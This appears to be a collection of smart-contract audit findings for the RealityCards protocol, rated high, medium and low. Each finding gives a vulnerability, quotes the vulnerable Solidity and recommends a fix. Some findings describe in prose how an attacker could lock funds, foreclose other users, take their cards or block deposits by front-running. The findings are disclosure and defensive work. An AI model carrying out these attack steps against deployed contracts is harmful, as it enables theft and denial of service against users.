    _promotion.token.safeTransfer(_user, _rewardsAmount);

    emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);

    return _rewardsAmount;
}
```

#### Recommended Mitigation Steps

Consider checking that the total rewards claimed for a given promotion is strictly `<=` than the total allotted balance provided by the promotion creator. This should help prevent a single promotion from affecting the rewards claimable from other promotions."
13.md,Unchecked ERC20 transfers can cause lock up,high,"eth), [a_delamo](https://twitter.com/a_delamo), [s1m0](https://twitter.com/_smonica_), [cmichel](https://twitter.com/cmichelio), and [shw](https://github.com/x9453)_

Some major tokens went live before ERC20 was finalized, resulting in a discrepancy whether the transfer functions should (A) return a boolean or (B) revert/fail on error. The current best practice is that they should revert, but return “true” on success. However, not every token claiming ERC20-compatibility is doing this — some only return true/false; some revert, but do not return anything on success. This is a well known issue, heavily discussed since mid-2018.

Today many tools, including OpenZeppelin, offer [a wrapper for “safe ERC20 transfer”](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol):

RealityCards is not using such a wrapper, but instead tries to ensure successful transfers via the `balancedBooks` modifier:

```solidity
modifier balancedBooks {
    _;
    // using >= not == in case anyone sends tokens direct to contract
    require(
        erc20.balanceOf(address(this)) >=
            totalDeposits + marketBalance + totalMarketPots,
        ""Books are unbalanced!""
    );
}
```

This modifier is present on most functions, but is missing on `topupMarketBalance`:
```solidity
function topupMarketBalance(uint256 _amount) external override {
    erc20.transferFrom(msgSender(), address(this), _amount);
    if (_amount > marketBalanceDiscrepancy) {
        marketBalanceDiscrepancy = 0;
    } else {
        marketBalanceDiscrepancy -= _amount;
    }
    marketBalance += _amount;
}
```

In the case where an ERC20 token which is not reverting on failures is used, a malicious actor could call `topupMarketBalance` with a failing transfer, but also move the value of `marketBalance` above the actual holdings. After this, `deposit`, `withdrawDeposit`, `payRent`, `payout`, `sponsor`, etc. could be locked up and always failing with “Books are unbalanced”.

Anyone can call `topupMarketBalance` with some unrealistically large number, so that `marketBalance` does not overflow, but is above the actually helping balances. This is only possible if the underlying ERC20 used is not reverting on failures, but is returning “false” instead.

**Recommended Steps**:
1. Use something like OpenZeppelin’s `SafeERC20`
2. Set up an allow list for tokens, which are knowingly safe
3. Consider a different approach to the `balancedBooks` modifier"
13.md,Can access cards of other markets,high,"Within `RCMarket.sol` the functions `ownerOf` and `onlyTokenOwner` do not check if the `_cardId/_token` is smaller than `numberOfCards`. So it's possible to supply a larger number and access cards of other markets.
The most problematic seems to be `upgradeCard`. Here the check for `isMarketApproved` can be circumvented by trying to move the card via another market.

You can still only move cards you own.
```solidity
// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L338
    function ownerOf(uint256 _cardId) public view override returns (address) {
        uint256 _tokenId = _cardId + totalNftMintCount; // doesn't check if _cardId < numberOfCards
        return nfthub.ownerOf(_tokenId);
    }

https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L313
  modifier onlyTokenOwner(uint256 _token) {
        require(msgSender() == ownerOf(_token), ""Not owner""); // _token could be higher than numberOfCards,
        _;
    }

function upgradeCard(uint256 _card) external onlyTokenOwner(_card) {   // _card  could be higher than numberOfCards,
    _checkState(States.WITHDRAW);
    require(
        !factory.trapIfUnapproved() ||
            factory.isMarketApproved(address(this)),   // this can be circumvented by calling the function via another market
        ""Upgrade blocked""
    );
    uint256 _tokenId = _card + totalNftMintCount;    // _card  could be higher than numberOfCards, thus accessing a card in another market
    _transferCard(ownerOf(_card), address(this), _card); // contract becomes final resting place
    nfthub.withdrawWithMetadata(_tokenId);
    emit LogNftUpgraded(_card, _tokenId);
}
```

Recommend adding the following to `ownerOf`:
`require(_card < numberOfCards, ""Card does not exist"");`"
13.md,anyone can call function `sponsor`,high,"This function `sponsor` should only be called by the factory, however, it does not have any auth checks, so that means anyone can call it with an arbitrary `_sponsorAddress` address and transfer tokens from them if the allowance is > 0:
```solidity
    /// @notice ability to add liqudity to the pot without being able to win.
    /// @dev called by Factory during market creation
    /// @param _sponsorAddress the msgSender of createMarket in the Factory
    function sponsor(address _sponsorAddress, uint256 _amount)
        external
        override
    {
        _sponsor(_sponsorAddress, _amount);
    }
```

Recommend checking that the sender is a factory contract."
13.md,Anyone can affect deposits of any user and turn the owner of the token,high,"dlamo](https://twitter.com/a_delamo)_

On `RCTreasury`, we have the method `collectRentUser`. This method is public, so anyone can call it using whatever user and whatever timestamp.
So, calling this method using `user = XXXXX` and `_timeToCollectTo = type(uint256).max)`, would make `isForeclosed[user] = true`.

See [issue page](https://github.com/code-423n4/2021-06-realitycards-findings/issues/119) for referenced code

Now, we can do the same for all the users bidding for a specific token.
Finally, I can become the owner of the token by just calling `newRental` and using a small price. `newRental` will iterate over all the previous bid and will remove them because there are foreclosed.

Recommend that `collectRentUser` should be private and create a new public method with `onlyOrderbook` modifier."
13.md,payout doesn't fix `isForeclosed` state,medium,"The function payout of `RCTreasury.sol` doesn't undo the `isForeclosed` state of a user.
This would be possible because with a payout a user will receive funds so he can lose his `isForeclosed` status.

For example the function `refundUser` doesn't check and update the `isForeclosed` status in `RCTreasury` [on L429](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L429) and [line 447](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L447).

Recommend checking and updating the `isForeclosed` state in the payout function."
13.md,Critical `uberOwner` address changes should be a two-step process,medium,"dlamo](https://twitter.com/a_delamo)._

As specified, `uberOwners` of `Factory`, `Orderbook` and `Treasury` have the highest privileges in the system because they can upgrade contracts of `market`, `Nfthub`, `order book`, `treasury`, `token` and `factory` which form the critical components of the protocol.

The contracts allow for `uberOwners` to be changed to a different address from the contract owner/deployer using the `changeUberOwner()` function which is callable by the current `uberOwner`. While this function checks for zero-address, there is no validation of the new address being correct. If the current `uberOwner` incorrectly uses an invalid address for which they do not have the private key, then the system gets locked because the `uberOwner` cannot be corrected and none of the other functions that require `uberOwner` caller can be executed.

Impact: The current `uberOwner` uses a non-zero but incorrect address as the new `uberOwner`. This gets set and now the system is locked and none of the `uberOwner`-only callable functions are callable. This error cannot be fixed either and will require redeployment of contracts which will mean that all existing markets have to be terminated. The system will have to be shut and restarted completely from scratch which will take a reputation hit and have a serious technical and business impact.

Recommend changing the single-step change of `uberOwner` address to a two-step process where the current `uberOwner` first approves a new address as a `pendingUberOwner`. That `pendingUberOwner` has to then claim the ownership in a separate transaction which cannot be done if they do not have the correct private key. An incorrectly set `pendingUberOwner` can be reset by changing it again to the correct one who can then successfully claim it in the second step.



 _**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/5)_"
13.md,Missing `balancedBooks` modifier could result in failed system insolvency detection,medium,"The `balancedBooks` modifier is used to “check that funds haven't gone missing during this function call” and is applied to `deposit`, `withdrawDeposit`, `payRent`, `payout` and `sponsor Treasury` functions which move funds in and out of the Treasury or adjust its market/user balances.

However, this modifier is missing in the `refundUser()` and `topupMarketBalance()` functions which also perform similar actions. The impact is that any miscalculations in these functions will lead to the system becoming insolvent.

Recommend adding modifier to the two functions above where it is missing.


_**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/23)_"
13.md,`minRentalDayDivisor` can be different between markets and treasury,medium,"_](https://twitter.com/eriksal1217)) and [paulius.eth](https://twitter.com/SolidityDev)_

The `minRentalDayDivisor` is defined in `RCTreasury.sol` and copied to each market.
The `minRentalDayDivisor` can be updated via `setMinRental`, but then it isn't updated in the already created market.

To calculate the minimum rent time, in function `withdrawDeposit` of `RCTreasury.sol`, the latest version of `minRentalDayDivisor` is used, which could be different than the values in the market.
So the markets will calculate the minimum rent time different.
This could lead to unexpected results
```solidity
function initialize(
     ...
        minRentalDayDivisor = treasury.minRentalDayDivisor();

https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L322
 function withdrawDeposit(uint256 _amount, bool _localWithdrawal)
...
  require( user[_msgSender].bidRate == 0 || block.timestamp - (user[_msgSender].lastRentalTime) > uint256(1 days) / minRentalDayDivisor, ""Too soon"");
..
 if ( user[_msgSender].bidRate != 0 &&  user[_msgSender].bidRate / (minRentalDayDivisor) >  user[_msgSender].deposit ) {
..

// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L169
  function setMinRental(uint256 _newDivisor) public override onlyOwner {
        minRentalDayDivisor = _newDivisor;
    }
```

Recommend either accepting or at least documenting the risk of change to code to prevent this from happening."
13.md,"`RCFactory.createMarket()` does not enforce `_timestamps` and `_timestamps` being larger than `_timestamps`, even though proper functioning requires them to be so",medium,"`RCFactory.createMarket()` does not enforce `_timestamps`[1] and `_timestamps`[2] being larger than `_timestamps`[0], even though proper functioning requires them to be so.

`IRCMarket` defines a sequence of events that each market should progress through sequentially, CLOSED, OPEN, LOCKED, WITHDRAW. ([1](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/interfaces/IRCMarket.sol#L7))

The comments explicitly state that `_incrementState()` should be called ""thrice"" ([2](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L1093))

However, it is possible to create a market where these events do not occur sequentially.

You can create a market where the `marketOpeningTime` is later than the `marketLockingTime` and `oracleResolutionTime`.

This is because although `RCFactory` checks to ensure that `_timestamps[2]` is greater than `_timestamps[1]`, it does not check to ensure that `_timestamps[1]` is greater than `_timestamps[0]` ([3](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L539))

This is also because although RCFactory checks to ensure that `_timestamps[0]` is equal to or greater than `block.timestamp`, it makes no check for a minimum value for `_timestamps[1]` or `_timestamps[2]`, or a relative check between the value of `_timestamps[0]` and `_timestamps[1]`. ([4](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L521))

Thus, you can create a market where the `marketLockingTime` and the `oracleResolutionTime` occur before the `marketOpeningTime`.

When calling `RCFactory.createMarket()`, Alice can supply 0 as the argument for `_timestamps[1]` and `_timestamps[2]`, and any value equal to or greater than `block.timestamp` for `_timestamps[0]` ([5](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L468))

Recommend adding the following check to `RCFactory.createMarket()`:
```solidity
require(
    _timestamps[0] < _timestamps[1],
    ""market must begin before market can lock""
);
```"
13.md,Possible locked-ether (funds) Issue in `RCOrderbook.sol`,medium,"_](https://twitter.com/eriksal1217))_

When running the analyzer code, the following functions were found in `RCOrderbook.sol` to possibly lock funds due to it being a payable function with no withdraw function associated. See [Issue #43](https://github.com/code-423n4/2021-06-realitycards-findings/issues/43) for more details."
13.md,`maxSumOfPrices` check is broken,medium,"`rentAllCards()` requires the sender to specify a `_maxSumOfPrices` parameter which specifies “limit to the sum of the bids to place” as specified in the Natspec @param comment. This is apparently for front-run protection.

However, this function parameter constraint for `_maxSumOfPrices` is broken in the function implementation which leads to the total number of bids placed greater than the `_maxSumOfPrices` specified.

The impact of this is that the user may not have sufficient deposited, be foreclosed upon and/or impacted on other bids/markets.

Scenario: Assume two cards for a market with current winning rentals of 50 each. `_maxSumofPrices` = 101 passes check on L643 but then the forced 10% increase on L650 (assuming sender is not the owner of either card) causes `newRentals` to be called with 55 for each card thus totalling to 110 which is > 101 as requested by the user.

Recommend modifing the max sum of prices check logic to consider the 10% increase scenarios. Document and suggest the max sum of prices for the user in the UI based on the card prices and 10% requirement depending on card ownership."
13.md,Flows can bypass market and global pause,medium,"Ability to pause all token transfers and all state changes for contracts is a “guarded-launch” best-practice for emergency situations for newly launched projects. The project implements this using a `marketsPaused` flag per market and a `globalPause` flag across all markets.

While these prevent renting of cards in a specific market and deposit/withdraw/rent cards across all markets, there are still public/external functions that are unguarded by these flags which can affect contract state in paused scenarios that will make it hard/impossible to recover correctly from the emergency pause.

Examples include`topupMarketBalance()` and `refundUser()` in `Treasury` can be triggered even in a `globalPause` scenario. There could be other function flows where it is not obvious that market/global pausing is enabled because it is enforced in one of the functions called deep within the code within one of the conditionals.

The impact is that markets get paused but the contracts cannot be restarted because of state changes affected during the pause via unguarded external/public functions.

Recommend applying `marketPaused` and `globalPause` check clearly in the beginning of all public/external functions which move tokens/funds in/out or change contract state in any way. Also, Validate all possible control flows to check that market/global pausing works in all scenarios and applies to all contract state and not specific functionalities."
13.md,Deposit whitelist enforced on `msg.sender` instead of user,medium,"The Treasury `deposit()` function credits amount to the user address in parameter instead of the `msgSender()` function that is actually making the deposit with the rationale (as explained in the Natspec comment) being that this may be called via contract or L1-L2 bot.

However, the deposit whitelist should ideally be enforced on the `_user` address. If `msgSender()` is blacklisted, user address can still `deposit()` from another whitelisted `msgSender()` address while retaining the user address that is used for leader boards and NFTs.

The impact of this is that even if the user misbehaves in interactions with the system (e.g. trolls, spams) and their corresponding `msgSender()` is removed from the whitelist. The user can continue to deposit into the system via another whitelisted `msgSender()` without any impact to leader boards or NFTs.

Recommend using whitelist on user address instead of `msgSender()`."
13.md,Missing call to `removeOldBids` may affect foreclosure,medium,"`Orderbook.removeBids()` as commented:
```
///remove bids in closed markets for a given user
///this can reduce the users `bidRate` and chance to foreclose
```


`removeOldBids()` is performed currently in `Market.newRental()` and `Treasury.deposit()` to  “do some cleaning up, it might help cancel their foreclosure” as commented. However, this is missing in the `withdrawDeposit()` function where the need is the most because user is removing deposit which may lead to foreclosure and is even commented as being useful on L356.

The impact is that, if we do not remove closed market bids during withdrawDeposit, the closed market bids still get accounted in user's `bidRate` in the conditional on L357 and therefore do not prevent the foreclosure in `withdrawDeposit` that may happen in L357-L367. User may get foreclosed because of mis-accounted closed-market bids in the order book.

Recommend adding call to `removeOldBids()` on L355 of `withdrawDeposit()` of Treasury."
13.md,NFT Hub implementation deviates from ERC721 for transfer functions,medium,"ERC721 standard and implementation allows the use of approved addresses to affect transfers besides the token owners. However, the L2 NFT Hub implementation deviates from ERC721 by ignoring the presence of any approvers in the overriding function implementations of `transferFrom()` and `safeTransferFrom()`.

The impact is that the system interactions with NFT platforms may not work if they expect ERC721 adherence. Users who interact via approved addresses will see their transfers failing for their approved addresses.

Given that the key value proposition of this project is the use of NFTs, the expectation will be that it is fully compatible with ERC721.

Recommend adding support for approval in NFT transfers."
13.md,`RCNftHubL2.safeTransferFrom` not according to spec,medium,"The `RCNftHubL2.safeTransferFrom` function does not correctly implement the ERC721 spec:
> When using `safeTransferFrom`, the token contract checks to see that the receiver is an IERC721Receiver, which implies that it knows how to handle ERC721 tokens. [ERC721](https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#IERC721-safeTransferFrom)

This check is not implemented, it just drops the `_data` argument.

Contracts that don't know how to handle ERC721 tokens (are not an `IERC721Receiver`) can accept them but they should not when using `safeTransferFrom` according to spec.

Recommend Implementing the `IERC721Receiver` check in `safeTransferFrom`."
13.md,Wrong calculation on `_collectRentAction`,medium,"dlamo](https://twitter.com/a_delamo)_

The method `_collectRentAction` contains the [following code](https://github.com/code-423n4/2021-06-realitycards-findings/issues/122#issue-922787380):

in case 6, it is doing:
```solidity
_refundTime = block.timestamp - marketLockingTime;
```
instead of:
 ```solidity
 _refundTime = _timeUserForeclosed - marketLockingTime;
 ```
This could lead to funds being drained by the miscalculation."
13.md,Market-specific pause is not checked for sponsor,medium,"The treasury only checks its `globalPause` field but does not check its market-specific `marketPaused` field for `Treasury.sponsor`.
A paused market contract can therefore still deposit as a sponsor using `Market.sponsor` and result in the market-specific pause not work correctly.

Recommend adding checks for `marketPaused` in the Treasury for `sponsor`."
13.md,Deposits don't work with fee-on transfer tokens,medium,"There are ERC20 tokens that may make certain customizations to their ERC20 contracts.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.

The `deposit()` function will introduce unexpected balance inconsistencies when comparing internal asset records with external ERC20 token contracts.

Recommend measuring the asset change right before and after the asset-transferring routines as a possible mitigation.


**[Splidge (Reality Cards) disputed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/152#issuecomment-863172608)
 > oh, trying the same one again..? 😁
> https://github.com/code-423n4/2021-05-88mph-findings/issues/16
>
> I'll fight this one though, I'd argue that we are using ERC20 tokens and according to the ERC20 [spec](https://github.com/code-423n4/2021-05-88mph-findings/issues/16) for transferFrom:
>
> > Transfers `_value` amount of tokens from address `_from` to address `_to`
>
> A deflationary token therefore isn't compliant to ERC20 as it doesn't transfer the full `_value` and so it isn't what we are planning to use and not relevant here."
13.md,Deposits can be denied by abusing `maxContractBalance`,medium,"The treasury implements a max contract balance check in the `deposit` function:

```solidity
require(
    (erc20.balanceOf(address(this)) + _amount) <= maxContractBalance,
    ""Limit hit""
);
```
A whale can stop anyone from depositing by front-running a user's deposit with a deposit that pushes the contract balance to the `maxContractBalance` limit first. The user's deposit will then fail in the check. Afterwards, the whale can withdraw again.

> This is not only restricted to whales, miners/users can do the same using same-block cross-transaction flashloans and submitting a `(attacker deposit, user deposit, attacker withdraw)` flashbundle to a miner. Possibilities like this will only become more prevalent in the future.

Any users can be blocked from depositing which prevents them from renting cards.
This allows an attacker to manipulate the outcome of a market in their favor by strategically preventing other competitors to bid on their cards (causing forfeiture due to a low deposit balance).

Recommend removing the contract limit or at least set the limit very high if it keeps happening."
13.md,Function `foreclosureTimeUser` returns a shorter user's foreclosure time than expected,medium,"The function `foreclosureTimeUser` of `RCTreasury` underestimates the user's foreclosure time if the current time is not the user's last rent calculation time. The underestimation of the foreclosure time could cause wrong results when determining the new owner of the card.

The variable `timeLeftOfDeposit` at line 668 is calculated based on `depositAbleToWithdraw(_user)`, the user's deposit minus the rent from the last rent calculation to the current time. Thus, the variable `timeLeftOfDeposit` indicates the time left of deposit, starting from now. However, at line 672, the `foreclosureTimeWithoutNewCard` is calculated by `timeLeftOfDeposit` plus the user's last rent calculation time instead of the current time. As a result, the user's foreclosure time is reduced. From another perspective, the rent between the last rent calculation time and the current time is counted twice.

Recommend changing `depositAbleToWithdraw(_user)` at line 669 to `user[_user].deposit`. Or, change `user[_user].lastRentCalc` at both line 672 and 678 to `block.timestamp`."
13.md,Use of `assert()` instead of `require()`,low,"eth) and [cmichel](https://twitter.com/cmichelio)_

Contracts use `assert()` instead of `require()` in multiple places. This causes a Panic error on failure and prevents the use of error strings.

Prior to solc 0.8.0, `assert()` used the invalid opcode which used up all the remaining gas while `require()` used the revert opcode which refunded the gas and therefore the importance of using `require()` instead of `assert()` was greater. However, after 0.8.0, `assert()` uses revert opcode just like `require()` but creates a `Panic(uint256)` error instead of `Error(string)` created by `require()`. Nevertheless, Solidity’s documentation says:
> ""Assert should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix. Language analysis tools can evaluate your contract to identify the conditions and function calls which will cause a Panic.”

whereas

> “The require function either creates an error without any data or an error of type Error(string). It should be used to ensure valid conditions that cannot be detected until execution time. This includes conditions on inputs or return values from calls to external contracts.”

Recommend using `require()` with informative error strings instead of `assert()`.


_**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/155)_"
13.md,Lack of zero address validation,low,"eth), also found by [0xRajeev](https://twitter.com/0xRajeev), maplesyrup ([heiho1](https://github.com/heiho1) and [thisguy__](https://twitter.com/eriksal1217)), and [cmichel](https://twitter.com/cmichelio)_


The constructor of `RCorderbook.sol` lacks zero address validation, since parameter of constructor are used initialize state variable which are used in other functions of the contract, error in these state variable can lead to redeployment of contract.

Recommend adding a required condition to check for zero address.


 > Additional changes for #142 and #115 are [here](https://github.com/RealityCards/RealityCards-Contracts/commit/cb84f08feba06ab52385e2380b5ced707bfef7a4)"
13.md,Multiple calls necessary for `getWinnerFromOracle`,low,"Sometimes multiple calls necessary to `getWinnerFromOracle` are necessary to get the `_winningOutcome` to be processed:
- `getWinnerFromOracle` calls `setWinner`
- `setWinner` calls `lockMarket`
- `lockMarket` calls `collectRentAllCards`
- `collectRentAllCards` can return false, which means is has to be called again. In that case the `_winningOutcome` isn't processed and `getWinnerFromOracle` has to be called again.

It's not easy to determine how many times `getWinnerFromOracle` has to be called.
(it can be seen via `emit LogWinnerKnown(winningOutcome)`, however this cannot be read from a smart contract)

Recommend letting the function `getWinnerFromOracle` return a boolean to indicate it has to be called again."
13.md,`addToWhitelist` doesn't check `factoryAddress`,low,"The function `addToWhitelist` of `RCTreasury.sol` does a call to the `factory` contract, however the `factoryAddress` might not be initialized, because it is set via a different function (`setFactoryAddress`).
The function `addToWhitelist` will revert when it calls a 0 address, but it might be more difficult to troubleshoot.

[L233](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L233)
```solidity
   function setFactoryAddress(address _newFactory) external override {
        ...
        factoryAddress = _newFactory;
    }
```

[L210](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L210)
```solidity
    function addToWhitelist(address _user) public override {
        IRCFactory factory = IRCFactory(factoryAddress);
        require(factory.isGovernor(msgSender()), ""Not authorised"");
        isAllowed[_user] = !isAllowed[_user];
    }
```

Recommend verifying that `factoryAddress` is set in the function `addToWhitelist`, for example using the following code.
 ```require(factory != address(0), ""Must have an address"");```"
13.md,Deposit double-counting miscalculation could incorrectly prevent user foreclosure,low,"In the `deposit` function, the deposit `_amount` has already been added to the user's deposit on L303. The addition of `_amount` again to the deposit on L309 for checking against daily `bidRate` effectively leads to double counting of deposited `_amount` and may keep/bring user out of foreclosure even though they are not.

**Scenario**: Alice’s current daily `bidRate` is 500 and deposit is 350. She makes a new deposit of 100 which should not bring her out of foreclosure because the new effective deposit will be 300+150 = 450 which is still less than 500. However, because of the double-counting miscalculation, the check performed is 450+100 > 500 which will pass and Alice is not foreclosed. She effectively gains double the deposit amount in treatment of deposits against foreclosure.

Recommend changing the conditional predicate on L309-310 from:
`user[_user].deposit + _amount > user[_user].bidRate / minRentalDayDivisor`
to:
`user[_user].deposit > user[_user].bidRate / minRentalDayDivisor`



 _**Note:** Additional conversation regarding this vulnerability can be found [here](https://github.com/code-423n4/2021-06-realitycards-findings/issues/26)_"
13.md,unnecessary emit of `LogUserForeclosed`,low,"The function deposit of `RCTreasury.sol` resets the `isForeclosed` state and emits `LogUserForeclosed`, if the use have enough funds.
However this also happens if the user is not Foreclosed and so the emit is redundant and confusing.

[L279](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L279)
```solidity
function deposit(uint256 _amount, address _user) public override balancedBooks returns (bool) {
   ....
        // this deposit could cancel the users foreclosure
        if ( (user[_user].deposit + _amount) > (user[_user].bidRate / minRentalDayDivisor) ) {
            isForeclosed[_user] = false;
            emit LogUserForeclosed(_user, false);
        }
        return true;
    }
```

Recommend only do the emit when `isForeclosed` was true"
13.md,Use of `ecrecover` is susceptible to signature malleability,low,"dlamo](https://twitter.com/a_delamo)_

The `ecrecover` function is used to verify and execute Meta transactions. The built-in EVM precompile `ecrecover` is susceptible to signature malleability (because of non-unique s and v values) which could lead to replay attacks

While this is not exploitable for replay attacks in the current implementation because of the use of nonces, this may become a vulnerability if used elsewhere.

Recommend considering using [OpenZeppelin’s ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/cryptography/ECDSA.sol) (which prevents this malleability) instead of the built-in function:"
13.md,NFT minting limit dependence on block gas limit,low,"The current block gas limit is 15M and not 12.5 as indicated in the comment for `setNFTMintingLimit(60)` in Factory’s constructor. So this could be changed accordingly but a safe threshold needs to be enforced in the setter `setNFTMintingLimit()` which is currently lacking. That would prevent accidentally setting the minting limit to something beyond what the block gas limit would safely allow.

Recommend that If NFT minting limit dependence on block gas limit is critical to the functioning, consider using `GASLIMIT` opcode to dynamically check block gas limit to set `nftMintingLimit` appropriately before creating a market."
13.md,Basis points usage deviates from general definition,low,"The general definition of basis points is 100 bps = 1%. The usage here, 1000 bps = 100%, deviates from generally accepted definition and could cause confusion among users/creators/affiliates or potential miscalculations.

Recommend documenting the used definition of basis points or switch to the generally accepted definition."
13.md,Missing input validation on timeout,low,"Factory constructor sets timeout to 86400 seconds but setter `setTimeout()` has no threshold checks for a min timeout value. If this is accidentally set to 0 or lower-than-safe value then there is no dispute window and users lose confidence in market.

Recommend adding input validation for threshold checks on both low and high ends."
13.md,`isGovernor` excludes `Factory` owner,low,"In the Factory contract, the `Factory` owner is authorized to change approval for governor addresses and is also treated as a governor in the modifier `onlyGovernors`. However, `isGovernor` modifier excludes `Factory` owner as a governor for some reason. This function is used only by `Treasury` to whitelist users who can deposit tokens and would make sense to include `Factory` owner as a governor to be consistent.

Without doing so, `Factory` owner cannot whitelist users without adding itself or someone else as a governor.

Recommend including `Factory` owner in `isGovernor()`."
13.md,Making `isMarketApproved` False on an operational market will lock NFTs to L2,low,"Once market is approved and operational, changing approval to false should not be allowed or else it will prevent NFTs from being withdrawn to mainnet. All other Governor controlled variables are used during market creation and not thereafter, except this one. The other `onlyGovernors` functions only affect state before market creation but this one affects after creation.

Recommend that once market is approved and operational, changing approval to false should not be allowed."
13.md,Susceptible to collusion and sybil attacks,low,"Collusion and sybil attacks are general problems with blockchain-based prediction markets and voting systems.

Collusion between market creator and bidders, where the creator creates a niche prediction market for which only they know the outcome with a higher degree of probability (than others) and either spawn fake users (sybils) to increase the pot size and lure victims to add bids. Creator or its fake users maintain the longest duration on the winning outcome (which they know with greater certainty than others) thus winning that market’s outcome and taking the victim's rents (winner-take-all-mode).

The general problem is hard to solve. Recommend documenting and warning users suitably about risks involved."
13.md,Misplaced zero-address check,low,"Misplaced zero-address check for `nfthub` on L595 in `createMarket()` because `nfthub` cannot be 0 at this point as `nfthub`.`addMarket()` on L570 would have already reverted if that were the case.

Recommend moving `nfthub` zero-address check to before the call to `nfthub.addMarket()`."
13.md,Missing market open check,low,"`Missing _checkState(States.OPEN)` on first line of `rentAllCards()` as specified on L617. These core market functions are supposed to operate only when market is open but the missing check allows control to proceed further in the control flow. In this case, the function proceeds to call `newRental()` which has a conditional check state == `States.OPEN` and silently returns success otherwise, without reverting.

The impact of this is that `rentAllCards` does not fail if executed when market is closed or locked. `newRental` returns silently without failure when market is closed or locked.

Add a `require()` to check market open state in the beginning of all core market functions and revert with an informative error string otherwise."
13.md,Assert indicates unnecessary check or missing constraint/logic,low,"`updateLastRentalTime()` function “tracks when the user last rented so they cannot rent and immediately withdraw thus bypassing minimum rental duration.”

This function currently always returns true and so there is no need to assert its return value, as done in `newRental()`, unless it was meant to return false in some scenarios which indicates missing constraint/logic. It is not clear what that might be.

Given that the minimum rental duration is one of the two key protection mechanisms, any missing logic/constraint here could affect the project significantly.

Recommend validating constraint/logic to see if function should return false in any scenario. Remove assert at call site if otherwise."
13.md,`exitedTimestamp` set prematurely,low,"The `exitedTimestamp` flag is used to prevent front-running of user exiting and re-entering in the same block. The setting of this flag in `exit()` should really be inside the conditionals and triggered only if current owner or if `bidExists`. It currently assumes that either of the two will always be true which may not necessarily be the case.

The impact of this is that a user accidentally exiting a card he doesn't own or have a bid for currently, will be marked as exited and prevented from a `newRental` in the same block. User can prevent one's own `newRental` from succeeding, because it was accidentally triggered, by front-running it himself with an exit. There could be other more realistic scenarios.

Recommend setting `exitedTimestamp` flag only when the conditionals are true within `exit()`"
13.md,`Test` function left behind can expose order book,low,"The `getBid()` order book function is noted in its Natspec @dev comments as “@dev just to pass old tests, not needed otherwise @dev to be deleted once tests updated” but is left behind here.

This function could externally expose orderbook ordering (prev/next linked list) for malicious contracts to potentially time or price bids to its advantage.

Recommend removing the function as noted."
13.md,Shadowing Local Variables found in `RCOrderbook.sol`,low,"_](https://twitter.com/eriksal1217))_

According to the [Slither-analyzer documentation](https://github.com/crytic/slither/wiki/Detector-Documentation#local-variable-shadowing), shadowing local variables is naming conventions found in two or more variables that are similar. Although they do not pose any immediate risk to the contract, incorrect usage of the variables is possible and can cause serious issues if the developer does not pay close attention.

It is recommended that the naming of the [following variables](https://github.com/code-423n4/2021-06-realitycards-findings/issues/124) should be changed slightly to avoid any confusion.

**Recommended mitigation steps**:
1. Clone Project Repository
2. Run Project against Hardhat network;
   compile and run default test on contracts.
3. Installed slither analyzer:
  https://github.com/crytic/slither
4. Ran [\$ slither .] against `RCOrderbook.sol` and all contracts to verify results"
13.md,`totalNftMintCount` can be replaced with ERC721 `totalSupply()`,low,"I can't find a reason why `totalNftMintCount` in `Factory` can't be replaced with ERC721 `totalSupply()` to make it less error-prone. As `nfthub.mint` issues a new token it should automatically increment `totalSupply` and this assignment won't be needed:
>       totalNftMintCount = totalNftMintCount + _tokenURIs.length;
Also in function `setNftHubAddress` you need to manually set `_newNftMintCount` if you want to change `nfthub` so an invalid value may crash the system. `totalSupply()` will eliminate `totalNftMintCount` and make the system more robust.

Recommend replacing `totalNftMintCount` with nfthub `totalSupply()` in `Factory` contract."
13.md,`RCTreasury.addToWhitelist()` will erroneously remove user from whitelist if user is already whitelisted,low,"smonica_)_

`RCTreasury.addToWhitelist()` will erroneously remove user from whitelist if user is already whitelisted

The comments state that calling `addToWhitelist()` should add a user to the whitelist.

However, since the implementation simply flips the user's whitelist bool, if the user is already on the whitelist, then calling `addToWhitelist()` will actually remove them from the whitelist.

Since batch`AddToWhitelist()` will repeatedly call `addToWhitelist()` with an entire array of users, it is very possible that someone could inadvertently call `addToWhitelist` twice for a particular user, thereby leaving them off of the whitelist.

If a governor calls `addToWhitelist()` with the same user twice, the user will not be added to the whitelist, even though the comments state that they should.

